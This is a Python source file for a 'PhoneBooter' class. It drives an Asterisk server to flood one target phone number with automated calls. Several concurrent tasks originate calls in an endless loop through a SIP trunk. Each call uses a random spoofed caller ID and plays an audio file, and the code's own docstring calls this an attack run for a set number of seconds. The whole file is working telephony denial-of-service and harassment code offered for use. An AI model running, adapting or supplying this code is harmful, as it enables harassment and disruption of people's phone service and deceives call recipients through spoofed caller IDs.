import asyncio
import threading
from panoramisk.call_manager import CallManager
from libs.generaterandoms import GenerateRandoms


class PhoneBooter(object):

    def __init__(self):

        self.loop = asyncio.get_event_loop()

    @asyncio.coroutine
    def originate(self, targetNum, wav):

        callmanager = CallManager(host='127.0.0.1',
                                  port=5038,
                                  ssl=False,
                                  encoding='utf8')

        yield from callmanager.connect()

        auth = yield from callmanager.send_action({'Action': 'login',
                                                   'Username': 'test',
                                                   'Secret': 'password'})

        # if successful, auth.response returns "Success"
        if auth.response != 'Success':
            print("Failed to login!")
            return

        while True:
            random_number = GenerateRandoms('en_US').phone_number()
            print("Calling with number: %s" % random_number)

            call = yield from callmanager.send_originate({
                'Action': 'Originate',
                'Channel': 'SIP/flowroute/{num}'.format(num=targetNum),
                'WaitTime': 20,
                'CallerID': '{idnum}'.format(idnum=random_number),
                'Application': 'Playback',
                'Data': '{wav}'.format(wav=wav),
                'Async': True
            })


    async def stop_after(self, loop, when):
        await asyncio.sleep(when)
        loop.stop()

    def start(self, targetNum, numThreads, bootLength, wav):

        thread_stop = threading.Event()
        thread = threading.Thread(target=self.launch, args=(targetNum, numThreads, bootLength, wav),
                                  name=targetNum)
        thread.daemon = True
        thread.start()

    def launch(self, targetNum, numThreads, bootLength, wav):
        """Run an attack for the specified number of seconds against the target."""

        for x in list(range(numThreads)):
            self.loop.create_task(self.originate(targetNum, wav))

        self.loop.create_task(self.stop_after(self.loop, bootLength))
        self.loop.run_forever()
